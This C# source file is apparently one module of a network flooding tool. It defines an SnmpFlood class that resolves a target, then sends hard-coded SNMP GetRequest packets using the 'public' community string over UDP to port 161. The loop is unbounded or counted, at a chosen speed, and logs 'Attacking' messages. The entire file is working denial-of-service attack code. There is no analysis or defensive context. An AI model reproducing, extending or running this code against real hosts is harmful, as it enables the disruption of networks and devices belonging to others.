using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ConnectFlood
{
    public class SnmpFlood : IAttack
    {
        public void StartFlood(string target, int packetCount, int speed, string none)
        {
            string ip;
            int port = 161;

            try
            {
                if (target.StartsWith("http://") || target.StartsWith("https://"))
                {
                    Uri uri = new Uri(target);
                    ip = Dns.GetHostAddresses(uri.Host)[0].ToString();
                }
                else
                {
                    string[] targetParts = target.Split(':');
                    ip = targetParts[0]; 
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[SNMP] Error parsing target: {ex.Message}");
                return;
            }

            Console.WriteLine($"[SNMP] Attacking {ip}:{port} | Packets: {(packetCount == -1 ? "∞" : packetCount.ToString())} | Speed: {speed}ms");

            IPEndPoint snmpTarget = new IPEndPoint(IPAddress.Parse(ip), port);
            UdpClient udpClient = new UdpClient();
            int sentPackets = 0;

            while (packetCount == -1 || sentPackets < packetCount)
            {
                try
                {
                    byte[] snmpPacket = GenerateSnmpRequest();
                    udpClient.Send(snmpPacket, snmpPacket.Length, snmpTarget);
                    Console.WriteLine($"[SNMP] Packet {sentPackets + 1} sent to {ip}:{port}");
                    sentPackets++;
                }
                catch (SocketException ex)
                {
                    Console.WriteLine($"[SNMP] Error: {ex.Message}");
                    break;
                }

                if (speed > 1)
                    Thread.Sleep(speed);
            }

            udpClient.Close();
            Console.WriteLine("[SNMP] Attack finished.");
        }

        private byte[] GenerateSnmpRequest()
        {
            return new byte[]
            {
                0x30, 0x26, 0x02, 0x01, 0x00, 0x04, 0x06, 0x70, 0x75, 0x62, 0x6C, 0x69,  // SNMP Header
                0x63, 0xA0, 0x19, 0x02, 0x04, 0x71, 0x99, 0x6F, 0x0E, 0x02, 0x01, 0x00,
                0x02, 0x01, 0x00, 0x30, 0x0B, 0x30, 0x09, 0x06, 0x05, 0x2B, 0x06, 0x01,
                0x02, 0x01, 0x05, 0x00
            };
        }
    }
}
